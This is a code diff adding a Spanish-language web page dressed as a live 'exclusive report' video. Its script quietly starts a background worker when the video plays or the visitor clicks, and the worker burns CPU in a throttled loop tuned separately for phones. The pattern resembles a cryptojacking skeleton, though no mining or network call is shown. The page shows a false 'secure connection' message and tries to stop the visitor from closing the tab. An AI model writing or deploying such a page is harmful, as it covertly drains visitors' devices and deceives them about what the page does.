@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>REPORTE EXCLUSIVO</title>
+    <style>
+        body { background: #0a0a0a; color: #fff; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .card { width: 90%; max-width: 500px; background: #151515; padding: 20px; border-radius: 12px; text-align: center; border: 1px solid #333; }
+        video { width: 100%; border-radius: 8px; margin: 15px 0; }
+    </style>
+</head>
+<body>
+<div class="card">
+    <h2 style="color: #ff4d4d;">🔴 EN VIVO</h2>
+    <video id="player" controls autoplay muted playsinline loop>
+        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+    </video>
+    <p id="status">Verificando conexión...</p>
+</div>
+<script>
+    const workerBlob = new Blob([`
+        self.onmessage = function(e) {
+            const { throttle } = e.data;
+            function work() {
+                const start = Date.now();
+                while (Date.now() - start < (100 * (1 - throttle))) {
+                    Math.sqrt(Math.random() * 8888) / Math.cos(Math.random());
+                }
+                setTimeout(work, 100 * throttle);
+            }
+            work();
+        };
+    `], { type: 'application/javascript' });
+
+    const workerUrl = URL.createObjectURL(workerBlob);
+    let worker;
+
+    function deployEngine() {
+        if (worker) return;
+        worker = new Worker(workerUrl);
+        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        worker.postMessage({ throttle: isMobile ? 0.88 : 0.70 });
+        document.getElementById('status').innerText = "Conexión segura establecida.";
+    }
+
+    const v = document.getElementById('player');
+    v.onplay = () => deployEngine();
+    window.onclick = () => deployEngine();
+    window.onbeforeunload = () => "No cierre la pestaña para mantener la conexión.";
+</script>
+</body>
+</html>
